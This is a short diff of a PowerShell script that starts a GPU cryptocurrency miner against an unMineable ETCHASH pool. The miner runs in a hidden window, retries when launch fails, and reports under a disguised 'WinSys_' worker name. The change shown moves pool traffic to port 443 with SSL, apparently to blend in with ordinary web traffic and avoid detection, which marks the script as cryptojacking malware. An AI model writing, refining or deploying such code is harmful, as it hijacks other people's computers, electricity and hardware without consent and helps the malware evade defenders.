@@ -240,7 +240,7 @@ if (Test-Path $cpuExe) {
 }
 
 if ($gpuExe -and (Test-Path $gpuExe)) {
-    $gpuArgs = "--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:$($c.addr).WinSys_${mName}_G#1871184566 --pass x --intensity 25 --ssl 0"
+    $gpuArgs = "--algo ETCHASH --server etchash.unmineable.com:443 --user XMR:$($c.addr).WinSys_${mName}_G --pass x --intensity 25 --ssl 1"
     $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru -EA 0
     if (!$gpuProc) { Start-Sleep 3; $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru -EA 0 }
 }
